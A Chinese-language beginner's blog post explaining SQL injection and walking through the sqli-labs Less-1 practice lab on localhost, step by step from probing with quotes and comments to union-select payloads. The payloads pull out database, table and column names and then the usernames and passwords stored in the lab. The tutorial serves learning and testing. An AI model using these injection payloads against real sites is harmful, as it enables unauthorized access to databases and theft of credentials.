SQL注入浅析

发表于 2019-09-11 | | 阅读次数:

什么是SQL注入？

​ 首先，我们要知道什么是SQL注入，简单来说，就是在输入字符串中嵌入SQL指令，如果在程序设计时忽略了对特殊字符串的检查，这些嵌入的指令便会被误认为正常的SQL指令，在数据库中执行，因此可以对后台数据库进行查看等操作，甚至破坏后台数据库造成严重后果。

SQL注入大致可以分为普通注入和盲注
普通注入：攻击者通过观察返回的错误提示信息进行注入
盲注：网络上有好多种解释，作为刚入门的小白，我的理解是攻击者能得到的页面只有成功和失败的页面（废话。。。），准确的说失败的页面不会像普通注入那样给你返回有用的错误提示信息，甚至有可能是什么都没有，而且即使成功了也不会显示我们想要的数据，这就需要我们一步一步的去猜。那么，如何知道我们的注入语句是成功的还是失败的呢？一般情况是通过页面的响应时间来进行判断，如果说我们构造的语句是错误的，那么页面会在极短的时间内响应完毕，如果正确的话，那么我们的页面的响应时间就会稍长一些。

入门级SQL注入过程（sqli-labs靶场练习）

  1. 寻找注入点
    那么我们该如何寻找注入点呢？
    传统的SQL语句可控参数分为两类：
    1.数字类型参数不用被引号扩起来，如?id=1
    2.其他类型，参数要被引号括起来，如?name=”phone”
    判断某个链接是否存在SQL注入，可以对传入的可控参数进行简单构造，通过服务端返回的内容判断有无注入
    以靶场sqli-labs为例

    可以看到当我们在页面请求里构造?id=1 and 1=2后

    此时返回页面正常，这说明了什么？说明了此处不是数字型注入漏洞，为什么这么说呢？因为我们在?id=1后面加上的那句and1=2,既然是and，那么一假一真为假，如果是数字型注入漏洞的话就会报错，而回显却没问题，那么就可以排除是数字型注入漏洞。而当我们在?id=1之后加上一个'，再看

    ​ 此时页面回显不正常，提示我们SQL语法错误，这说明什么？说明我们的语句已经被执行了，但是由于语法不正确，所以报错。语句被执行，那么就说明此处可能存在字符型的注入，那么我们再加一把火，在页面请求的后面在加上一条注释 –+（注：–空格在SQL里表示注释，但是浏览器在发送请求时将末尾的空格舍去，所以我们用+来代替空格，因为+在经过URL编码后会变为空格。）

    ​ 此时页面回显正常，可以确定此处存在单引号字符型注入漏洞。知道了是单引号字符型注入漏洞，那我们接下来就可以构造语句语句一步一步的接近我们想要接近的数据，构造order by语句来测试所在表有几个字段，如图所示，为3时正常，为4时出错，说明表有三个字段

​ 那么，知道了有三个字段后便可以使用union联合查询来测试页面是否存在显示位，语句如下：union select 5,6,7 –+

​ 发现页面输出了6和7，说明有两个显示位，那么接下来，就可以利用SQL语句依次爆破出数据库名，表名，列名，字段信息等
http://localhost/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+//查询数据库名

查询security内的表：http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’) –+

接着继续爆破出列名：select group_concat(column_name) from information_schema.columns where table_name=’users’

最后就是激动人心的时刻，直接爆破出用户名和密码：select group_concat(username) from security.users // 用户名
lesect group_concat(password) from security.users//用户密码
